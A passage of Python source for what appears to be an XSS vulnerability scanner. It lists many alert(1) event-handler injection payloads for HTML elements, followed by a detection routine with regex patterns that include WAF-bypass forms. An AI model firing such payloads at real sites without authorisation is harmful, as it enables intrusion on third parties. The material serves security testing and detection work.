            XSSPayload("Canvas Key Down", "<canvas onkeydown=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Key Press", "<canvas onkeypress=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Key Up", "<canvas onkeyup=\"alert(1)\" contenteditable>test</canvas>", "high"),
            XSSPayload("Canvas Mouse Down", "<canvas onmousedown=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Enter", "<canvas onmouseenter=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Leave", "<canvas onmouseleave=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Move", "<canvas onmousemove=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Out", "<canvas onmouseout=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Over", "<canvas onmouseover=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Mouse Up", "<canvas onmouseup=\"alert(1)\">test</canvas>", "high"),
            XSSPayload("Canvas Paste", "<canvas onpaste=\"alert(1)\" contenteditable>test</canvas>", "high"),
            
            # Caption XSS Payloads
            XSSPayload("Caption Drag", "<caption draggable=\"true\" ondrag=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Drag End", "<caption draggable=\"true\" ondragend=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Drag Enter", "<caption draggable=\"true\" ondragenter=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Drag Leave", "<caption draggable=\"true\" ondragleave=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Drag Start", "<caption draggable=\"true\" ondragstart=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Activate", "<caption id=x tabindex=1 onactivate=alert(1)></caption>", "high"),
            XSSPayload("Caption Before Activate", "<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>", "high"),
            XSSPayload("Caption Before Deactivate", "<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>", "high"),
            XSSPayload("Caption Deactivate", "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>", "high"),
            XSSPayload("Caption Focus", "<caption id=x tabindex=1 onfocus=alert(1)></caption>", "high"),
            XSSPayload("Caption Focus In", "<caption id=x tabindex=1 onfocusin=alert(1)></caption>", "high"),
            XSSPayload("Caption Before Copy", "<caption onbeforecopy=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Before Cut", "<caption onbeforecut=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Before Paste", "<caption onbeforepaste=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Blur", "<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>", "high"),
            XSSPayload("Caption Click", "<caption onclick=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Context Menu", "<caption oncontextmenu=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Copy", "<caption oncopy=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Cut", "<caption oncut=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Double Click", "<caption ondblclick=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Focus Out", "<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>", "high"),
            XSSPayload("Caption Key Down", "<caption onkeydown=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Key Press", "<caption onkeypress=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Key Up", "<caption onkeyup=\"alert(1)\" contenteditable>test</caption>", "high"),
            XSSPayload("Caption Mouse Down", "<caption onmousedown=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Enter", "<caption onmouseenter=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Leave", "<caption onmouseleave=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Move", "<caption onmousemove=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Out", "<caption onmouseout=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Over", "<caption onmouseover=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Mouse Up", "<caption onmouseup=\"alert(1)\">test</caption>", "high"),
            XSSPayload("Caption Paste", "<caption onpaste=\"alert(1)\" contenteditable>test</caption>", "high"),
            
            # Center XSS Payloads
            XSSPayload("Center Drag", "<center draggable=\"true\" ondrag=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Drag End", "<center draggable=\"true\" ondragend=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Drag Enter", "<center draggable=\"true\" ondragenter=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Drag Leave", "<center draggable=\"true\" ondragleave=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Drag Start", "<center draggable=\"true\" ondragstart=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Activate", "<center id=x tabindex=1 onactivate=alert(1)></center>", "high"),
            XSSPayload("Center Before Activate", "<center id=x tabindex=1 onbeforeactivate=alert(1)></center>", "high"),
            XSSPayload("Center Before Deactivate", "<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>", "high"),
            XSSPayload("Center Deactivate", "<center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>", "high"),
            XSSPayload("Center Focus", "<center id=x tabindex=1 onfocus=alert(1)></center>", "high"),
            XSSPayload("Center Focus In", "<center id=x tabindex=1 onfocusin=alert(1)></center>", "high"),
            XSSPayload("Center Before Copy", "<center onbeforecopy=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Before Cut", "<center onbeforecut=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Before Paste", "<center onbeforepaste=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Blur", "<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>", "high"),
            XSSPayload("Center Click", "<center onclick=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Context Menu", "<center oncontextmenu=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Copy", "<center oncopy=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Cut", "<center oncut=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Double Click", "<center ondblclick=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Focus Out", "<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>", "high"),
            XSSPayload("Center Key Down", "<center onkeydown=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Key Press", "<center onkeypress=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Key Up", "<center onkeyup=\"alert(1)\" contenteditable>test</center>", "high"),
            XSSPayload("Center Mouse Down", "<center onmousedown=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Enter", "<center onmouseenter=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Leave", "<center onmouseleave=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Move", "<center onmousemove=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Out", "<center onmouseout=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Over", "<center onmouseover=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Mouse Up", "<center onmouseup=\"alert(1)\">test</center>", "high"),
            XSSPayload("Center Paste", "<center onpaste=\"alert(1)\" contenteditable>test</center>", "high"),
            
            # Cite XSS Payloads
            XSSPayload("Cite Drag", "<cite draggable=\"true\" ondrag=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Drag End", "<cite draggable=\"true\" ondragend=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Drag Enter", "<cite draggable=\"true\" ondragenter=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Drag Leave", "<cite draggable=\"true\" ondragleave=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Drag Start", "<cite draggable=\"true\" ondragstart=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Activate", "<cite id=x tabindex=1 onactivate=alert(1)></cite>", "high"),
            XSSPayload("Cite Before Activate", "<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>", "high"),
            XSSPayload("Cite Before Deactivate", "<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>", "high"),
            XSSPayload("Cite Deactivate", "<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>", "high"),
            XSSPayload("Cite Focus", "<cite id=x tabindex=1 onfocus=alert(1)></cite>", "high"),
            XSSPayload("Cite Focus In", "<cite id=x tabindex=1 onfocusin=alert(1)></cite>", "high"),
            XSSPayload("Cite Before Copy", "<cite onbeforecopy=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Before Cut", "<cite onbeforecut=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Before Paste", "<cite onbeforepaste=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Blur", "<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>", "high"),
            XSSPayload("Cite Click", "<cite onclick=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Context Menu", "<cite oncontextmenu=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Copy", "<cite oncopy=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Cut", "<cite oncut=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Double Click", "<cite ondblclick=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Focus Out", "<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>", "high"),
            XSSPayload("Cite Key Down", "<cite onkeydown=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Key Press", "<cite onkeypress=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Key Up", "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>", "high"),
            XSSPayload("Cite Mouse Down", "<cite onmousedown=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Enter", "<cite onmouseenter=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Leave", "<cite onmouseleave=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Move", "<cite onmousemove=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Out", "<cite onmouseout=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Over", "<cite onmouseover=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Mouse Up", "<cite onmouseup=\"alert(1)\">test</cite>", "high"),
            XSSPayload("Cite Paste", "<cite onpaste=\"alert(1)\" contenteditable>test</cite>", "high"),
            
            # Code XSS Payloads
            XSSPayload("Code Drag", "<code draggable=\"true\" ondrag=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Drag End", "<code draggable=\"true\" ondragend=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Drag Enter", "<code draggable=\"true\" ondragenter=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Drag Leave", "<code draggable=\"true\" ondragleave=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Drag Start", "<code draggable=\"true\" ondragstart=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Activate", "<code id=x tabindex=1 onactivate=alert(1)></code>", "high"),
            XSSPayload("Code Before Activate", "<code id=x tabindex=1 onbeforeactivate=alert(1)></code>", "high"),
            XSSPayload("Code Before Deactivate", "<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>", "high"),
            XSSPayload("Code Deactivate", "<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>", "high"),
            XSSPayload("Code Focus", "<code id=x tabindex=1 onfocus=alert(1)></code>", "high"),
            XSSPayload("Code Focus In", "<code id=x tabindex=1 onfocusin=alert(1)></code>", "high"),
            XSSPayload("Code Before Copy", "<code onbeforecopy=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Before Cut", "<code onbeforecut=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Before Paste", "<code onbeforepaste=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Blur", "<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>", "high"),
            XSSPayload("Code Click", "<code onclick=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Context Menu", "<code oncontextmenu=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Copy", "<code oncopy=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Cut", "<code oncut=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Double Click", "<code ondblclick=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Focus Out", "<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>", "high"),
            XSSPayload("Code Key Down", "<code onkeydown=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Key Press", "<code onkeypress=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Key Up", "<code onkeyup=\"alert(1)\" contenteditable>test</code>", "high"),
            XSSPayload("Code Mouse Down", "<code onmousedown=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Enter", "<code onmouseenter=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Leave", "<code onmouseleave=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Move", "<code onmousemove=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Out", "<code onmouseout=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Over", "<code onmouseover=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Mouse Up", "<code onmouseup=\"alert(1)\">test</code>", "high"),
            XSSPayload("Code Paste", "<code onpaste=\"alert(1)\" contenteditable>test</code>", "high")
        ]
    
    def detect_xss_in_response(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """Deteksi XSS dalam response dengan pattern yang lebih komprehensif"""
        # Cek apakah payload muncul dalam response (prioritas utama)
        if payload in response_text:
            return True, "Payload reflected"
        
        # Cek apakah payload muncul dalam response dengan encoding
        import html
        if html.unescape(payload) in response_text:
            return True, "Payload reflected (decoded)"
        
        # Cek pattern XSS yang lebih komprehensif
        xss_patterns = [
            # Script tags dengan alert
            r'<script[^>]*>.*?alert\([^)]*\).*?</script>',
            r'<script[^>]*>.*?eval\([^)]*\).*?</script>',
            r'<script[^>]*>.*?document\.write\([^)]*\).*?</script>',
            r'<script[^>]*>.*?prompt\([^)]*\).*?</script>',
            
            # Event handlers dengan alert dan prompt
            r'<img[^>]*onerror[^>]*(?:alert|prompt)[^>]*>',
            r'<img[^>]*onload[^>]*(?:alert|prompt)[^>]*>',
            r'<svg[^>]*onload[^>]*(?:alert|prompt)[^>]*>',
            r'<input[^>]*onfocus[^>]*(?:alert|prompt)[^>]*>',
            r'<input[^>]*onblur[^>]*(?:alert|prompt)[^>]*>',
            r'<input[^>]*onclick[^>]*(?:alert|prompt)[^>]*>',
            r'<a[^>]*onclick[^>]*(?:alert|prompt)[^>]*>',
            r'<a[^>]*onmouseover[^>]*(?:alert|prompt)[^>]*>',
            r'<div[^>]*onclick[^>]*(?:alert|prompt)[^>]*>',
            r'<body[^>]*onload[^>]*(?:alert|prompt)[^>]*>',
            r'<iframe[^>]*onload[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onclick[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onblur[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*oncopy[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*oncontextmenu[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*oncut[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*ondblclick[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*ondrag[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onfocus[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*oninput[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onkeydown[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onkeypress[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onkeyup[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onmousedown[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onmousemove[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onmouseout[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onmouseover[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onmouseup[^>]*(?:alert|prompt)[^>]*>',
            r'<x[^>]*onpaste[^>]*(?:alert|prompt)[^>]*>',
            
            # JavaScript protocols dengan alert dan prompt
            r'javascript:(?:alert|prompt)\([^)]*\)',
            r'javascript:eval\([^)]*\)',
            r'javascript:document\.write\([^)]*\)',
            
            # CSS expressions dengan alert
            r'expression\([^)]*(?:alert|prompt)[^)]*\)',
            r'background:url\([^)]*javascript:[^)]*(?:alert|prompt)[^)]*\)',
            
            # Template injection patterns
            r'\{\{[^}]*\}\}',
            r'\$\{[^}]*\}',
            r'#\{[^}]*\}',
            
            # VBScript dengan alert
            r'<script[^>]*language=["\']vbscript["\'][^>]*>.*?(?:alert|prompt)[^>]*>',
            
            # Data URI dengan alert
            r'data:image/svg\+xml[^>]*onload[^>]*(?:alert|prompt)[^>]*',
            r'data:text/html[^>]*script[^>]*(?:alert|prompt)[^>]*',
            
            # WAF bypass patterns dengan alert dan prompt
            r'String\.fromCharCode\([^)]*\)',
            r'window\[["\'](?:alert|prompt)["\']\]\([^)]*\)',
            r'setTimeout\([^)]*(?:alert|prompt)[^)]*\)',
            r'Function\(["\'](?:alert|prompt)\([^)]*\)["\']\)',
            r'eval\([^)]*(?:alert|prompt)[^)]*\)',
            
            # Advanced patterns
            r'alert`[^`]*`',
            r'alert&[^;]*;',
            r'alert&#[^;]*;',
            r'\(alert\)\(',
            r'a=alert,a\(',
            r'\[[^\]]*\]\.find\(alert\)',
            r'top\[["\'][^"\']*["\']\]\(',
            r'top\[/[^/]*/\.source\+/[^/]*/\.source\]\(',
            r'al\\u[0-9a-fA-F]{4}rt\(',
            r'top\[["\'][^"\']*\\[0-9]+[^"\']*["\']\]\(',
            r'top\[[0-9]+\.\.toString\([0-9]+\)\]\(',
            r'navigator\.vibrate\(',
            r'eval\([^)]*\)',
            r'innerHTML=location\.hash',
            
            # Draggable patterns
            r'draggable=["\'][^"\']*["\'][^>]*ondrag[^>]*(?:alert|prompt)',
            r'draggable=["\'][^"\']*["\'][^>]*ondragend[^>]*(?:alert|prompt)',
            r'draggable=["\'][^"\']*["\'][^>]*ondragenter[^>]*(?:alert|prompt)',
            r'draggable=["\'][^"\']*["\'][^>]*ondragleave[^>]*(?:alert|prompt)',
            r'draggable=["\'][^"\']*["\'][^>]*ondragstart[^>]*(?:alert|prompt)',
            
            # Tabindex patterns
            r'tabindex=[^>]*onactivate[^>]*(?:alert|prompt)',
            r'tabindex=[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'tabindex=[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'tabindex=[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'tabindex=[^>]*onfocus[^>]*(?:alert|prompt)',
            r'tabindex=[^>]*onfocusin[^>]*(?:alert|prompt)',
            
            # Contenteditable patterns
            r'contenteditable[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onblur[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*oncopy[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*oncut[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onfocus[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*oninput[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'contenteditable[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Audio/Video patterns
            r'<audio[^>]*onpause[^>]*(?:alert|prompt)',
            r'<audio[^>]*onseeked[^>]*(?:alert|prompt)',
            r'<audio[^>]*onseeking[^>]*(?:alert|prompt)',
            r'<audio[^>]*onvolumechange[^>]*(?:alert|prompt)',
            r'<audio[^>]*onloadedmetadata[^>]*(?:alert|prompt)',
            r'<audio[^>]*onplay[^>]*(?:alert|prompt)',
            r'<audio[^>]*onplaying[^>]*(?:alert|prompt)',
            r'<audio[^>]*onended[^>]*(?:alert|prompt)',
            r'<audio[^>]*ontimeupdate[^>]*(?:alert|prompt)',
            r'<audio[^>]*oncanplay[^>]*(?:alert|prompt)',
            r'<audio[^>]*onloadeddata[^>]*(?:alert|prompt)',
            r'<audio[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<audio[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<video[^>]*onloadstart[^>]*(?:alert|prompt)',
            
            # Form patterns
            r'<form[^>]*onsubmit[^>]*(?:alert|prompt)',
            r'<select[^>]*onchange[^>]*(?:alert|prompt)',
            r'<menu[^>]*onshow[^>]*(?:alert|prompt)',
            
            # Body patterns
            r'<body[^>]*onpageshow[^>]*(?:alert|prompt)',
            r'<body[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<body[^>]*onhashchange[^>]*(?:alert|prompt)',
            r'<body[^>]*onscroll[^>]*(?:alert|prompt)',
            r'<body[^>]*onresize[^>]*(?:alert|prompt)',
            r'<body[^>]*onhelp[^>]*(?:alert|prompt)',
            r'<body[^>]*onorientationchange[^>]*(?:alert|prompt)',
            
            # HTML patterns
            r'<html[^>]*ontouchstart[^>]*(?:alert|prompt)',
            r'<html[^>]*ontouchend[^>]*(?:alert|prompt)',
            r'<html[^>]*ontouchmove[^>]*(?:alert|prompt)',
            r'<html[^>]*ontouchcancel[^>]*(?:alert|prompt)',
            
            # Marquee patterns
            r'<marquee[^>]*onstart[^>]*(?:alert|prompt)',
            r'<marquee[^>]*onfinish[^>]*(?:alert|prompt)',
            
            # Input patterns
            r'<input[^>]*autofocus[^>]*onblur[^>]*(?:alert|prompt)',
            r'<keygen[^>]*autofocus[^>]*onfocus[^>]*(?:alert|prompt)',
            
            # Image patterns
            r'<image[^>]*onerror[^>]*(?:alert|prompt)',
            r'<img[^>]*onerror[^>]*(?:alert|prompt)',
            
            # Script break patterns
            r'</scrip[^>]*script[^>]*>',
            r'<script[^>]*src=javascript:',
            r'<iframe[^>]*src=javascript:',
            r'<embed[^>]*src=javascript:',
            r'<object[^>]*data=javascript:',
            
            # External script patterns
            r'<script[^>]*src=//[^>]*>',
            r'<link[^>]*rel=import[^>]*href=',
            
            # Base patterns
            r'<base[^>]*href=//',
            
            # SVG patterns
            r'<svg[^>]*xmlns[^>]*onload[^>]*(?:alert|prompt)',
            r'<svg[^>]*xlink:href=',
            
            # Math patterns
            r'<math[^>]*xlink:href=javascript:',
            
            # Iframe patterns
            r'<iframe[^>]*srcdoc=',
            
            # GIF patterns
            r'GIF89a[^>]*<svg[^>]*onload[^>]*(?:alert|prompt)',
            
            # Data patterns
            r'data:[^>]*alert[^>]*',
            r'data:[^>]*script[^>]*alert[^>]*',
            
            # Additional HTML element patterns
            r'<base[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<base[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<base[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<base[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<base[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<base[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<base[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<base[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # Basefont patterns
            r'<basefont[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<basefont[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<basefont[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<basefont[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<basefont[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<basefont[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onblur[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onclick[^>]*(?:alert|prompt)',
            r'<basefont[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<basefont[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<basefont[^>]*oncut[^>]*(?:alert|prompt)',
            r'<basefont[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<basefont[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # BDI patterns
            r'<bdi[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<bdi[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<bdi[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<bdi[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<bdi[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*ondeactivate[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*onfocus[^>]*(?:alert|prompt)',
            r'<bdi[^>]*tabindex[^>]*onfocusin[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onbeforecopy[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onbeforecut[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onbeforepaste[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onblur[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onclick[^>]*(?:alert|prompt)',
            r'<bdi[^>]*oncontextmenu[^>]*(?:alert|prompt)',
            r'<bdi[^>]*oncopy[^>]*(?:alert|prompt)',
            r'<bdi[^>]*oncut[^>]*(?:alert|prompt)',
            r'<bdi[^>]*ondblclick[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onfocusout[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onkeydown[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onkeypress[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onkeyup[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmousedown[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<bdi[^>]*onpaste[^>]*(?:alert|prompt)',
            
            # BDO patterns
            r'<bdo[^>]*draggable[^>]*ondrag[^>]*(?:alert|prompt)',
            r'<bdo[^>]*draggable[^>]*ondragend[^>]*(?:alert|prompt)',
            r'<bdo[^>]*draggable[^>]*ondragenter[^>]*(?:alert|prompt)',
            r'<bdo[^>]*draggable[^>]*ondragleave[^>]*(?:alert|prompt)',
            r'<bdo[^>]*draggable[^>]*ondragstart[^>]*(?:alert|prompt)',
            r'<bdo[^>]*tabindex[^>]*onactivate[^>]*(?:alert|prompt)',
            r'<bdo[^>]*tabindex[^>]*onbeforeactivate[^>]*(?:alert|prompt)',
            r'<bdo[^>]*tabindex[^>]*onbeforedeactivate[^>]*(?:alert|prompt)',
